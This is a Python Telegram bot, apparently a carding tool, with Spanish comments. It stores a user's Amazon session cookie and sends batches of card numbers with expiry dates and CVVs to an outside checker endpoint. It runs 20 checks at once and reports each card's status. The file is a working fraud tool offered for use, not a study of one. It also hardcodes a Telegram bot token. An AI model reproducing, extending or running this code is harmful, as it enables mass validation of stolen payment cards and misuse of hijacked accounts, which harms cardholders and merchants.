import re
import requests
import asyncio
import os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Diccionario para guardar cookies por usuario
user_cookies = {}

# Regex para validar formato de tarjeta (16|2|4|3)
cc_regex = re.compile(r"^\d{16}\|\d{2}\|\d{4}\|\d{3}$")

# Endpoint
url = "https://leviatan-chk.site/amazon/leviatan"

# 🔹 CONFIGURACIÓN DE HILOS: Máximo 20 tareas simultáneas
sem = asyncio.Semaphore(20)

# 🔹 /start → muestra comandos disponibles
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Bot Optimizado (20 Hilos Activos)\n\n"
        "/cookie TU_COOKIE → guardar cookie\n"
        "/cc → procesar tarjetas\n\n"
        "Formato:\n1234567890123456|11|2028|123"
    )

# 🔹 /cookie → guarda cookie del usuario
async def set_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("❌ Usa: /cookie TU_COOKIE")
        return
    user_cookies[user_id] = " ".join(context.args)
    await update.message.reply_text("✅ cookie guardada con éxito")

# 🔹 Función de petición (Worker)
def hacer_request(data, headers):
    # Aumentamos un poco el timeout por la carga de 20 hilos
    return requests.post(url, json=data, headers=headers, timeout=20)

# 🔹 Tarea individual por tarjeta
async def procesar_tarjeta(i, tarjeta, cookie, message):
    async with sem: # Control de hilos
        data = {"card": tarjeta, "cookies": cookie}
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

        try:
            # Ejecuta la petición sin bloquear el resto del bot
            response = await asyncio.to_thread(hacer_request, data, headers)

            if response.status_code == 200:
                result = response.json()
                status = result.get('status', 'Desconocido')
                msg = result.get('message', 'Sin mensaje')
                await message.reply_text(f"💳 {i}. {tarjeta}\nStatus: {status}\nMsg: {msg}")
            else:
                await message.reply_text(f"❌ {i}. {tarjeta}\nError HTTP: {response.status_code}")

        except Exception:
            await message.reply_text(f"⚠️ {i}. {tarjeta}\nError de conexión")

# 🔹 /cc → procesa tarjetas de forma masiva
async def cc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in user_cookies:
        await update.message.reply_text("❌ primero usa /cookie")
        return

    cookie = user_cookies[user_id]
    text = update.message.text.replace("/cc", "").strip()
    lines = text.split("\n")
    valid = [l.strip() for l in lines if cc_regex.match(l.strip())]

    if not valid:
        await update.message.reply_text("❌ no hay tarjetas válidas")
        return

    total = len(valid)
    await update.message.reply_text(f"⏳ Procesando {total} tarjetas con 20 hilos...")

    # Creamos la lista de tareas para ejecutar en paralelo
    tasks = []
    for i, tarjeta in enumerate(valid, start=1):
        tasks.append(procesar_tarjeta(i, tarjeta, cookie, update.message))

    # Ejecuta todo respetando el límite del semáforo
    await asyncio.gather(*tasks)
    await update.message.reply_text(f"✅ Revisión finalizada.")

# 🔹 mensaje desconocido
async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ comando no válido, usa /start")

# 🔹 INICIAR BOT
if __name__ == '__main__':
    # Intentará leer la variable BOT_TOKEN de Railway, si no existe usará el token que pusiste
    TOKEN = os.getenv("BOT_TOKEN", "8272202025:AAEubjWNQYALrkENZ17sfMb8rfbJ5R3O2z8")

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cookie", set_cookie))
    app.add_handler(CommandHandler("cc", cc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))

    print("Bot en línea con 20 hilos...")
    app.run_polling()
    
